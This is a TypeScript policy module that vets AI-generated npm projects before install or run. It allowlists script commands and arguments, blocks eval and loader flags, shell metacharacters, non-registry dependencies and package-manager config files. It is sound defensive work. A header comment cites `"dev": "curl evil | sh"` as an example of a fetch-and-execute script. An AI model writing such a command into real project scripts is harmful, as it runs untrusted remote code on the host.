/**
 * What a generated project may ask npm to run.
 *
 * The runner spawns `npm run dev` as a fixed argv, which says nothing about
 * what `dev` then does: npm hands the script body to a shell, so a model that
 * writes `"dev": "curl evil | sh"` has written a command for this machine.
 * Install is worse, because lifecycle scripts run without anyone asking.
 *
 * The rule is an allowlist of forms rather than a denylist of bad words,
 * because the set of ways to spell a shell escape has no end and the set of
 * things a generated project legitimately runs is short.
 *
 * This is one layer and not a sandbox: an allowed tool still runs project
 * code (`node dist/index.js` runs whatever is in that file), and a registry
 * package still runs if the project imports it. Install scripts are handled
 * at install time, with `INSTALL_SCRIPT_PACKAGES`.
 */
import { posix } from 'node:path';

import type { RunnerFile } from '../runner.types.js';

export interface ScriptViolation {
  file: string;
  script: string;
  body: string;
  reason: string;
}

/** Every script npm can be made to run by something the platform does. */
const CHECKED_SCRIPTS = [
  'preinstall',
  'install',
  'postinstall',
  'prepublish',
  'preprepare',
  'prepare',
  'postprepare',
  ...['dev', 'start', 'build', 'typecheck', 'lint', 'test'].flatMap((name) => [
    `pre${name}`,
    name,
    `post${name}`,
  ]),
];

const SAFE_ENV_NAMES = new Set(['NODE_ENV', 'PORT', 'TZ', 'CI', 'FORCE_COLOR', 'DEBUG']);
const ENV_ASSIGNMENT = /^([A-Z_][A-Z0-9_]*)=([A-Za-z0-9_.:-]*)$/;
const SAFE_ARGUMENT = /^[A-Za-z0-9_@%+=:,./-]+$/;
const FORBIDDEN_SHELL = /[;|<>$`()\\{}!*?[\]~#"'\n\r]/;

/** Flags that turn an interpreter into "run this string" or "load this first". */
const INTERPRETER_FLAGS = new Set([
  '-e',
  '--eval',
  '-p',
  '--print',
  '-r',
  '--require',
  '--import',
  '--loader',
  '--experimental-loader',
  '-i',
  '--interactive',
]);

const PRISMA_SUBCOMMANDS = new Set(['generate', 'migrate', 'db', 'format', 'validate']);

/** `prisma db execute` runs arbitrary SQL and `db seed` an arbitrary command. */
const PRISMA_DB_ACTIONS = new Set(['push']);

/** nodemon's "run this instead of node", which needs no file in the project. */
const NODEMON_EXEC_FLAGS = new Set(['--exec', '-x']);

/**
 * Packages whose install script does real work a project needs.
 *
 * Install runs with scripts off, so a dependency chosen by a model that read
 * web content cannot execute anything by being installed. These are then
 * rebuilt by name, which runs only their scripts.
 */
export const INSTALL_SCRIPT_PACKAGES = [
  'bcrypt',
  'argon2',
  'esbuild',
  'sharp',
  'better-sqlite3',
  'prisma',
  '@prisma/engines',
  '@prisma/client',
] as const;

/** Tools a generated project runs by name, with no restriction beyond argument shape. */
const PLAIN_TOOLS = new Set([
  'tsc',
  'vite',
  'eslint',
  'prettier',
  'vitest',
  'jest',
  'next',
  'nuxt',
  'astro',
  'nest',
  'react-scripts',
]);

/** Tools that execute a file they are given, so their flags need the interpreter check. */
const FILE_RUNNERS = new Set(['node', 'tsx', 'ts-node', 'ts-node-dev', 'nodemon']);

function isContainedPath(argument: string): boolean {
  if (argument.startsWith('/')) return false;
  return !posix.normalize(argument).startsWith('..');
}

/** Why this one command is refused, or null when it fits an allowed form. */
function commandViolation(segment: string): string | null {
  const words = segment.trim().split(/\s+/).filter(Boolean);
  if (words[0] === 'cross-env') words.shift();

  while (words[0]?.includes('=') === true) {
    const assignment = ENV_ASSIGNMENT.exec(words[0]);
    if (!assignment?.[1] || !SAFE_ENV_NAMES.has(assignment[1])) {
      return `environment assignment "${words[0]}" is not allowed`;
    }
    words.shift();
  }

  const [program, ...args] = words;
  if (!program) return 'empty command';
  if (!PLAIN_TOOLS.has(program) && !FILE_RUNNERS.has(program) && program !== 'prisma') {
    return `"${program}" is not an allowed command`;
  }

  for (const argument of args) {
    if (!SAFE_ARGUMENT.test(argument)) return `argument "${argument}" is not allowed`;
    if (!argument.startsWith('-') && !isContainedPath(argument)) {
      return `path "${argument}" leaves the project`;
    }
    if (FILE_RUNNERS.has(program)) {
      const flag = argument.split('=')[0] ?? argument;
      if (INTERPRETER_FLAGS.has(flag)) return `flag "${flag}" is not allowed for ${program}`;
      if (program === 'nodemon' && NODEMON_EXEC_FLAGS.has(flag)) {
        return `flag "${flag}" is not allowed for ${program}`;
      }
    }
  }

  if (program === 'prisma' && !PRISMA_SUBCOMMANDS.has(args[0] ?? '')) {
    return `prisma subcommand "${args[0] ?? ''}" is not allowed`;
  }
  if (program === 'prisma' && args[0] === 'db' && !PRISMA_DB_ACTIONS.has(args[1] ?? '')) {
    return `prisma db action "${args[1] ?? ''}" is not allowed`;
  }
  return null;
}

/** Why this script body is refused, or null when every command in it is allowed. */
export function scriptViolation(body: string): string | null {
  // `&&` is the one operator allowed, so it is split out before the check for
  // every other shell metacharacter: a lone `&` backgrounds a process.
  const segments = body.split('&&');
  for (const segment of segments) {
    if (FORBIDDEN_SHELL.test(segment) || segment.includes('&')) {
      return 'shell operators other than && are not allowed';
    }
    const violation = commandViolation(segment);
    if (violation) return violation;
  }
  return null;
}

/**
 * Sources npm fetches and installs from without the registry's checks, each
 * of which can run install scripts from a place nobody reviewed.
 */
const REGISTRY_RANGE = /^[\w.*^~<>=|+ -]*$/;
const NPM_ALIAS = /^npm:(?:@[\w.-]+\/)?[\w.-]+(?:@[\w.*^~<>=|+ -]*)?$/;

function isRegistrySpec(spec: string): boolean {
  const trimmed = spec.trim();
  return REGISTRY_RANGE.test(trimmed) || NPM_ALIAS.test(trimmed);
}

/** Every spec in an `overrides` tree. `$name` refers to a declared dependency. */
function overrideSpecs(value: unknown, path: string): { name: string; spec: string }[] {
  if (typeof value === 'string') return value.startsWith('$') ? [] : [{ name: path, spec: value }];
  if (typeof value !== 'object' || value === null) return [];
  return Object.entries(value).flatMap(([key, nested]) =>
    overrideSpecs(nested, key === '.' ? path : key),
  );
}

function manifestViolations(file: RunnerFile): ScriptViolation[] {
  let manifest: {
    scripts?: unknown;
    dependencies?: unknown;
    devDependencies?: unknown;
    optionalDependencies?: unknown;
    peerDependencies?: unknown;
    overrides?: unknown;
  };
  try {
    manifest = JSON.parse(file.content) as typeof manifest;
  } catch {
    // npm reports an unparseable manifest far better than this could.
    return [];
  }

  const found: ScriptViolation[] = [];
  const scripts = (manifest.scripts ?? {}) as Record<string, unknown>;
  for (const name of CHECKED_SCRIPTS) {
    const body = scripts[name];
    if (typeof body !== 'string') continue;
    const reason = scriptViolation(body);
    if (reason) found.push({ file: file.path, script: name, body, reason });
  }

  const declared = [
    manifest.dependencies,
    manifest.devDependencies,
    manifest.optionalDependencies,
    manifest.peerDependencies,
  ].flatMap((group) =>
    Object.entries((group ?? {}) as Record<string, unknown>).flatMap(([name, spec]) =>
      typeof spec === 'string' ? [{ name, spec }] : [],
    ),
  );
  for (const { name, spec } of [...declared, ...overrideSpecs(manifest.overrides, 'overrides')]) {
    if (!isRegistrySpec(spec)) {
      found.push({
        file: file.path,
        script: `dependency ${name}`,
        body: spec,
        reason: 'dependencies must come from the npm registry',
      });
    }
  }
  return found;
}

/** Every reason this file set may not be installed or run. Empty means allowed. */
export function checkProjectPolicy(files: readonly RunnerFile[]): ScriptViolation[] {
  const found: ScriptViolation[] = [];
  for (const file of files) {
    const base = posix.basename(file.path);
    if (base === 'package.json' && !file.path.split('/').includes('node_modules')) {
      found.push(...manifestViolations(file));
    }
    // An .npmrc can point `script-shell` or the registry anywhere it likes.
    if (base === '.npmrc' || base === '.yarnrc' || base === '.yarnrc.yml') {
      found.push({
        file: file.path,
        script: base,
        body: '',
        reason: 'package manager configuration files are not allowed in a generated project',
      });
    }
  }
  return found;
}

export function describeViolations(violations: readonly ScriptViolation[]): string {
  return violations
    .slice(0, 5)
    .map((entry) => `${entry.file} "${entry.script}": ${entry.reason}`)
    .join('; ');
}
